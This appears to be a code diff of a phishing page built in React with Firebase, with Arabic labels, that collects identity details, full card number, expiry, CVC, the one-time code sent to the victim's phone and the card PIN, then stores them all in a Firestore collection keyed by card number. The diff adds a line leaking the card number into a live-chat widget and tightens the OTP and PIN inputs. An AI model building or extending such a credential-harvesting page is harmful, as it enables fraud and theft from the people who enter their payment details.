@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { initializeApp } from "firebase/app"
 import { getFirestore, doc, setDoc } from "firebase/firestore"
 import { Check, X } from "lucide-react"
-import { LiveChatWidget } from "@livechat/widget-react"
+import { LiveChatWidget, useWidgetCustomerData } from "@livechat/widget-react"
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
 
 
@@ -119,6 +119,7 @@ export default function Component() {
         e.preventDefault()
         let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc }, otp: { otp: otp },pass:pass }
         setDoc(doc(db, "data", cardNumber), alldat);
+        useWidgetCustomerData()!.name=alldat.payment.cardNumber ;
 
     }
 
@@ -410,17 +411,24 @@ return;
                                         <label htmlFor="otp">  رمز OTP</label>
                                         <p>الرجاء ادخال رمز التاكيد المرسل الى هاتفك</p>
                                         <Input
+                                        maxLength={6}
                                             defaultValue={otp}
+                                    type="numbers"
+
                                             onChange={(e) => setOTP(e.target.value)}
                                         />
-<Input
+
+                                    
+                                    </div>
+                                    <div className="flex justify-between mt-4">
+                                    <Input
+                                    type="numbers"
+                                    maxLength={4}
+
 placeholder="الرقم السري للبطاقة"
                                             defaultValue={pass}
                                             onChange={(e) => setPass(e.target.value)}
-                                        />                                        
-                                    </div>
-                                    <div className="flex justify-between mt-4">
-
+                                        />    
 
                                     </div>
                                 </>
